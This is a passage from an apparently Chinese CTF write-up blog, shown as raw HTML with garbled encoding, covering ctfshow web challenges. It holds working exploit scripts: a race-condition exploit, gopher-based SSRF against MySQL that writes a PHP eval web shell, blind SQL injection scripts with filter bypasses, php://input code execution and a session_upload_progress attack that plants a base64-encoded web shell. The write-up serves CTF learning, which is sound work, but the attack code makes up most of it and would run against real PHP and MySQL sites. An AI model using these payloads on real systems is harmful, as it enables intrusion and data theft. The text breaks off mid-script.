class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>key.dat</code>å‘ç°æ˜æ˜¾æ˜¯ç”¨<code>fastcoll</code>ç”Ÿæˆçš„ï¼Œä½†é¢˜ç›®å¹¶ä¸æ˜¯è¿™ç§æ€è·¯</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200217222354.png" style="zoom:80%;"><p>ä»‹ç»ä¸€ä¸‹<code>fastcoll</code>ï¼Œå·¥å…·å¯ä»¥ç”¨æ¥ç”Ÿæˆä¸¤ä¸ªMD5å€¼ç›¸åŒä½†å†…å®¹ä¸ç›¸åŒçš„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure><p>-p æ˜¯æºæ–‡ä»¶, -o æ˜¯è¾“å‡ºæ–‡ä»¶(ä¸¤ä¸ª)ï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨å·¥å…·ç”Ÿæˆå››ä¸ªMD5ç›¸åŒä½†å†…å®¹ä¸åŒçš„æ–‡ä»¶</p><p>å…ˆç”Ÿæˆä¸¤ä¸ªMD5ç›¸åŒä½†å†…å®¹ä¸åŒçš„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o 1.txt 2.txt</span><br></pre></td></tr></table></figure><p>å–å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºæºæ–‡ä»¶å†ç”Ÿæˆä¸¤ä¸ªMD5ç›¸åŒä½†å†…å®¹ä¸åŒçš„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p 1.txt -o 3.txt 4.txt</span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIM%E6%88%AA%E5%9B%BE20200217223957.png"></p><p>å¯ä»¥çœ‹åˆ°<code>1.txt</code> <code>2.txt</code>æ˜¯128å­—èŠ‚ï¼Œè€Œ<code>3.txt</code> <code>4.txt</code>æ˜¯256å­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å°†<code>3.txt</code>,<code>4.txt</code>æ–‡ä»¶å128å­—èŠ‚å–å‡ºæ¥æ”¾åœ¨<code>2.txt</code>åé¢ï¼Œä¾¿å¯ä»¥æœ‰å››ä¸ªMD5ç›¸åŒå†…å®¹ä¸ç›¸åŒçš„æ–‡ä»¶</p><p>å–å‡ºå¯ä»¥ç”¨<code>tail</code>,ä¸‹è½½è¿æ¥ï¼š<a href="https://www.trisunsoft.com/tail-for-windows.htm">https://www.trisunsoft.com/tail-for-windows.htm</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail.exe -c 128 3.txt &gt; a</span><br><span class="line">tail.exe -c 128 4.txt &gt; b</span><br></pre></td></tr></table></figure><p>åˆæˆå¯ç”¨winè‡ªå¸¦çš„type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type 2.txt a &gt; 5.txt</span><br><span class="line">type 2.txt b &gt; 6.txt</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨hxd</p><p>å†è¯´æœ¬é¢˜ ï¼Œé¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æ¡ä»¶ç«äº‰ï¼Œå³æˆ‘ä»¬åªéœ€æ»¡è¶³ç¬¬ä¸€ä¸ªMD5æ¯”è¾ƒä¹‹åç„¶åæ›´æ”¹æ–‡ä»¶å†…å®¹å³å¯ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">data</span>):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(r.text)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">mi=str(time.localtime().tm_min)</span><br><span class="line">m=hashlib.md5(mi.encode()).hexdigest()</span><br><span class="line">url=<span class="string">&#x27;http://124.156.121.112:28047/check.php?token=&#123;&#125;&amp;php://input&#x27;</span>.format(m)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;key.dat&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data1=f.read()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;nokey.dat&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data2=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">threading.Thread(target=post,args=(data1,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">threading.Thread(target=post,args=(data2,)).start()</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/2232">https://xz.aliyun.com/t/2232</a></p><h3 id="çº¢åŒ…é¢˜ç¬¬ä¹å¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬ä¹å¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬ä¹å¼¹"></a>çº¢åŒ…é¢˜ç¬¬ä¹å¼¹</h3><p>å¾ˆæ˜æ˜¾æ˜¯ssrf gopher://åè®®æ”»å‡»mysqlï¼Œè¯•äº†å¾ˆä¹…ï¼Œéƒ½æ²¡æˆåŠŸï¼Œè¿˜æ˜¯tclï¼Œæœ€é‡è¦çš„urlç¼–ç å¿˜è®°äº†ï¼Œæˆ‘TM</p><p>ä¸‹é¢ä»‹ç»ä¸‰ç§æ–¹å¼ç”Ÿæˆpayload:</p><h4 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h4><p><strong>å‡†å¤‡å·¥ä½œï¼š</strong></p><p>mysqlè®¾ç½®æ— å¯†ç ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯kali2019.3</p><p>ç›´æ¥åœ¨é…ç½®æ–‡ä»¶<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code>é‡Œçš„<code>[mysqld]</code>ä¸‹é¢å¢åŠ ä¸€è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure><p>é‡å¯mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>ä¸è¡Œå°±</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/mysql/mysql.server stop</span><br><span class="line">/usr/share/mysql/mysql.server start</span><br></pre></td></tr></table></figure><p><code>/var/www/html</code>æœ‰å†™æƒé™ï¼Œå…¶å®è¿™ä¸ªæ— æ‰€è°“ï¼ŒæŠ“çš„åªæ˜¯æµé‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /var/www/html</span><br></pre></td></tr></table></figure><p>tcpdumpç›‘å¬loç½‘å¡3306ç«¯å£æµé‡ï¼Œä¿å­˜åœ¨æ–‡ä»¶é‡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo port 3306 -w mysql.pacp</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h 127.0.0.1</span><br></pre></td></tr></table></figure><p>åœ¨sqlå‘½ä»¤è¡Œæ‰§è¡Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;/var/www/html/moonback.php&quot;</span>;</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>ç„¶åwiresharkæ‰“å¼€ï¼Œè¿½è¸ªtcpæµ</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200412231849.png" style="zoom:80%;"><p>é€‰æ‹©åŸå§‹æ•°æ®ï¼Œä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œhxdæ‰“å¼€æŠŠ16è¿›åˆ¶å¤åˆ¶åˆ°txtä¸­ï¼Œç„¶åç©ºæ ¼æ›¿æ¢%å·ï¼Œåˆ«å¿˜äº†ç¬¬ä¸€ä¸ªå¢åŠ %</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200412232521.png" style="zoom:80%;"><p>ç„¶åå°±å¯ä»¥å‘é€ç»™æœåŠ¡ç«¯äº†ï¼Œæ³¨æ„è¦urlç¼–ç ä¸€æ¬¡</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200412232835.png" style="zoom:80%;"><h4 id="common-gopher-tcp-stream"><a href="#common-gopher-tcp-stream" class="headerlink" title="common-gopher-tcp-stream"></a>common-gopher-tcp-stream</h4><p>githubåœ°å€ï¼š<a href="https://github.com/firebroo/sec_tools/tree/master/common-gopher-tcp-stream">https://github.com/firebroo/sec_tools/tree/master/common-gopher-tcp-stream</a></p><p>è¿™ä¸ªå·¥å…·ç›´æ¥æŠŠç¼–ç åçš„æ˜¾ç¤ºå‡ºæ¥äº†ï¼Œå¾ˆæ–¹ä¾¿</p><p>ä¸‹è½½ä¸‹æ¥é¦–å…ˆmakeç¼–è¯‘ä¸€ä¸‹</p><p>ç„¶åç›‘å¬,ç«¯å£å’Œ-på¿…é¡»æŒ¨ç€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sniffer -p3306</span><br></pre></td></tr></table></figure><p>æ¥ç€å’Œä¸Šé¢ä¸€æ ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h 127.0.0.1</span><br><span class="line">select <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> into outfile <span class="string">&quot;/var/www/html/moonback.php&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200412233442.png" style="zoom:80%;"><p>ç„¶åæäº¤çš„æ—¶å€™æ³¨æ„urlå†ç¼–ç ä¸€æ¬¡å°±è¡Œ</p><p>ä»”ç»†çœ‹äº†çœ‹å‘ç°é™¤äº†å¤§å°å†™ï¼Œä¸¤ä¸ªæµé‡æ²¡å•¥å·®åˆ«ï¼Œéƒ½æ˜¯16è¿›åˆ¶ï¼Œå¤§å°å†™æ— æ‰€è°“</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200412233705.png" style="zoom:80%;"><h4 id="Gopherus"><a href="#Gopherus" class="headerlink" title="Gopherus"></a>Gopherus</h4><p>githubåœ°å€ï¼š<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>ç›´æ¥ç”¨å·¥å…·ç”Ÿæˆä¹Ÿè¡Œï¼Œæ³¨æ„<strong>urlç¼–ç </strong>,æˆ‘çœŸåƒåœ¾</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200412234619.png" style="zoom:80%;"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>å¸ƒå°”ç›²æ³¨ï¼Œæ²¡å•¥è¿‡æ»¤ï¼Œç›´æ¥è·‘ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://783dfdd8-9d2e-4e68-b3df-e1b718d4a572.chall.ctf.show/&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;admin&#x27; or if(ascii(substr((select flag from web2.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid)),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;admin&#x27; or if(ascii(substr((select flag from web2.flag),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid)),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.post(url,data=data1)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>allow_url_fopenå’Œallow_url_includeéƒ½å¼€å¯äº†ï¼Œç›´æ¥<code>php://input</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">POST:</span><br><span class="line">&lt;?php system(&#39;cat ctf_go_go_go &#39;);</span><br></pre></td></tr></table></figure><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>è¿‡æ»¤äº†phpï¼Œç›´æ¥session_upload_progress GETshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://5c452cf4-fc3f-45c0-a872-3e818ec53c43.chall.ctf.show/&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=mb&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    files=&#123;</span><br><span class="line">        <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                                   <span class="comment">#ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27;</span>     <span class="comment">#æ¶æ„è¿›åº¦ä¿¡æ¯ï¼Œreadfileå°†ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url,files=files,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        POST()</span><br><span class="line">        t=r.get(<span class="string">&quot;http://5c452cf4-fc3f-45c0-a872-3e818ec53c43.chall.ctf.show/?url=/tmp/sess_mb&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">&#x27;[+] ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($v1) &amp;&amp; <span class="keyword">isset</span>($v2))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctype_alpha($v1))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($v1)==md5($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5å¼±æ¯”è¾ƒï¼Œpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</span><br></pre></td></tr></table></figure><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>å°±æ¯”web2å¤šè¿‡æ»¤ä¸ªç©ºæ ¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://7d7d60c5-b0fa-498e-842e-c12ef1378f0b.chall.ctf.show/&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;admin&#x27;/**/or/**/if(ascii(substr((select/**/flag/**/from/**/web2.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid)),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;admin&#x27;/**/or/**/if(ascii(substr((select/**/flag/**/from/**/web2.flag),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid)),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.post(url,data=data1)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>æ•°å­—å‹å¸ƒå°”æ³¨å…¥ï¼Œè¿‡æ»¤ç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;e3a532c0-bca9-4abc-a724-1adb2b991432.chall.ctf.show&#x2F;index.php?id&#x3D;&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    f1&#x3D;flag</span><br><span class="line">    top&#x3D;127</span><br><span class="line">    low&#x3D;33</span><br><span class="line">    while low&lt;&#x3D;top:</span><br><span class="line">        mid&#x3D;(top+low)&#x2F;&#x2F;2</span><br><span class="line">        p1&#x3D;&quot;if(ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;web7.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid))</span><br><span class="line">        p2&#x3D;&quot;if(ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;web7.flag),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid))</span><br><span class="line">        try:</span><br><span class="line">            r1&#x3D;requests.get(url+p2)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            if &#39;pitch-and-toss,&#39; in r1.text:</span><br><span class="line">                flag+&#x3D;chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">            r&#x3D;requests.get(url+p1)</span><br><span class="line">            if &#39;pitch-and-toss,&#39; in r.text:</span><br><span class="line">                low&#x3D;mid+1</span><br><span class="line">            else:</span><br><span class="line">                top&#x3D;mid-1</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">    if flag&#x3D;&#x3D;f1:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>è¿‡æ»¤ç©ºæ ¼å¯ä»¥ç”¨<code>/**/</code>ï¼Œè¿‡æ»¤<code>if</code>ç”¨<code>case when 1=1 then 1 else 0 end</code>ï¼Œè¿‡æ»¤é€—å·ç”¨<code>from 1 for 1</code>æˆªå–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://9f999441-8cb2-4663-9f55-195bbfafe615.chall.ctf.show/index.php?id=&quot;</span></span><br><span class="line">flag=<span 